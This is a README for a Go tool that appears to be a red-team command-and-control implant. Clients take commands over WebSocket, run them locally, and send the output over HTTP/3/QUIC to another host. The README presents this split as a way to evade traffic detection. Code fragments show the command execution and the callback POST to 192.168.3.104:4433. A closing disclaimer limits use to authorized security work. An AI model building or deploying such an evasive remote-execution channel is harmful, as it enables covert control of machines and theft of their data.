# WebSocket & QUIC Client-Server Project

## Overview

This project demonstrates a Go-based client-server architecture where communication happens through WebSocket, and certain events trigger HTTP/3 (QUIC) requests. The server uses WebSocket to exchange data, while HTTP/3 is used to send requests over the QUIC protocol. 

The server receives client commands over WebSocket, executes those commands, and sends the results to another endpoint via HTTP/3.

In traffic side confrontation, commands and results are not in the same package, which increases the difficulty of detection

## Features

- **WebSocket Communication**: The client connects to a WebSocket server and listens for messages. It can also send data over the WebSocket protocol.
- **Command Execution**: When the server sends a command via WebSocket, the client executes the command and retrieves the output.
- **QUIC Requests via HTTP/3**: The client's executed command results are sent to an HTTP/3 server using the QUIC protocol.
- **TLS Support**: Both WebSocket and HTTP/3 connections are secured using TLS (with an option to skip certificate verification in development).

## Components

### 1. WebSocket Server
The server listens for WebSocket connections and sends commands to connected clients. Clients receive these commands and execute them locally.

### 2. Client
The client:
- Connects to the WebSocket server over a secure connection (`wss://`).
- Listens for server-sent commands and executes them.
- Sends the execution output to an HTTP/3 server using a QUIC request.

### 3. QUIC (HTTP/3) Server
The server uses the QUIC protocol to handle incoming POST requests, which contain the result of the executed commands.

## Prerequisites

- Go 1.16+ installed.
- A valid TLS certificate and key for secure WebSocket and HTTP/3 connections.
- Libraries required:
  - [`gorilla/websocket`](https://github.com/gorilla/websocket)
  - [`quic-go/http3`](https://github.com/quic-go/quic-go)

## Setup

1. **Clone the repository**:
   ```bash
   git clone https://github.com/zhangyang9123/GoWSS-QUIC.git
   cd GoWSS-QUIC
   ```

2. **Install dependencies**:
   Ensure the required Go modules are installed:
   ```bash
   go mod tidy
   ```

3. **Generate or configure TLS certificates**:
   Ensure you have the necessary TLS certificates. You can generate them using tools like Let's Encrypt or OpenSSL.
   ```bash
   openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes
   ```

5. **Run the WebSocket AND QUIC server**:
   Start the QUIC (HTTP/3) server which listens on port `4433`:
   ```bash
   go run server.go
   ```

6. **Run the WebSocket client**:
   Run the client, which connects to the WebSocket server at `wss://127.0.0.1:8888/ws` And listen to trigger QUIC server to send requests:
   ```bash
   go run client.go
   ```

## Code Overview

### `server.go`

- **WebSocket Server**:
  The server listens for WebSocket connections on port `:8888`. When a client connects, the server can send commands that the client will execute.

- **QUIC Server**:
  The server listens for incoming HTTP/3 requests on port `:4433` secured by TLS. The client sends POST requests containing the results of command executions.

```go
http.HandleFunc("/ws", handleWebSocket)
log.Println("WebSocket server started on :8888")
log.Fatal(http.ListenAndServeTLS(":8888", certFile, keyFile, nil))
```

### `client.go`

- **WebSocket Client**:
  The client connects to the WebSocket server using a TLS-secured WebSocket connection (`wss://`). It listens for commands from the server, executes them locally, and sends the output to the QUIC server.

- **QUIC Request**:
  After executing the command received from the WebSocket server, the client sends the result via a POST request to the QUIC server using the HTTP/3 protocol.

```go
cmd := exec.Command(program, args...)
output, err := cmd.CombinedOutput()
// Send result to QUIC server
req, err := http.NewRequestWithContext(context.Background(), http.MethodPost, "https://192.168.3.104:4433", bytes.NewReader(output))
```

## How It Works

1. **Client-Server Communication**:
   - The client connects to the WebSocket server (`wss://127.0.0.1:8888/ws`).
   - The server sends a command to the client, which the client executes.
   - The result of the executed command is then sent over HTTP/3 to the server at `https://127.0.0.1:4433`.

2. **Randomized Behavior**:
   The client has a built-in feature where it randomly chooses whether to send the command output via QUIC. This can be modified for deterministic behavior.

## Example

1. **Start the server**:
   Run the WebSocket server (`server.go`) which also handles QUIC requests.

2. **Run the client**:
   Start the client (`client.go`) and connect it to the WebSocket server.

3. **Send a command from the server**:
   You can configure the server to send a command like:
   ```bash
   whoami
   ```

4. **Observe the results**:
   The client will execute the command and send the results to the HTTP/3 server via QUIC.
---

# Disclaimer
This tool is only intended for legally authorized enterprise security construction activities. If you need to test the usability of this tool, please set up your own target drone environment.
If you engage in any illegal behavior while using this tool, you shall bear the corresponding consequences on your own, and we will not assume any legal or joint liability.
Before installing and using this tool, please carefully read and fully understand the contents of each clause. Restrictions, disclaimers, or other clauses that involve your significant rights and interests may be highlighted in bold, underlined, or other forms. Unless you have fully read, understood, and accepted all the terms of this agreement, please do not install and use this tool. Your use or any other express or implied acceptance of this agreement shall be deemed as your reading and agreement to be bound by this agreement.
